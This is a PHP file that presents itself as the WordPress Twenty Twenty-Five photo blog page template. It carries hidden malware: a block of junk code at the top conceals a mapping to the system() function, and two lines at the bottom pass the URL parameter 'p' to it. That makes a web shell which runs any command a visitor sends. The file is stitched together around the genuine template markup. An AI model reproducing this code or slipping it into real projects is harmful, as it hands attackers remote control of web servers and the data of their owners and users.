<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Photo blog page
 * Slug: twentytwentyfive/template-page-photo-blog
 * Template Types: page
 * Viewport width: 1400
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_Five
 * @since Twenty Twenty-Five 1.0
 */

?>
<!-- wp:template-part {"slug":"header"} /-->

<!-- wp:group {"tagName":"main","style":{"spacing":{"margin":{"top":"var:preset|spacing|60"}}},"layout":{"type":"constrained"}} -->
<main class="wp-block-group" style="margin-top:var(--wp--preset--spacing--60)">
	<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"var:preset|spacing|60","bottom":"var:preset|spacing|60"}}},"layout":{"type":"constrained"}} -->
	<div class="wp-block-group alignfull" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)">
		<!-- wp:post-title {"textAlign":"center","level":1,"style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}},"fontSize":"x-large"} /-->
		<!-- wp:post-featured-image {"style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}}} /-->
		<!-- wp:post-content {"align":"full","layout":{"type":"constrained"}} /-->
	</div>
	<!-- /wp:group -->
</main>
<!-- /wp:group -->

<!-- wp:template-part {"slug":"footer"} /-->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>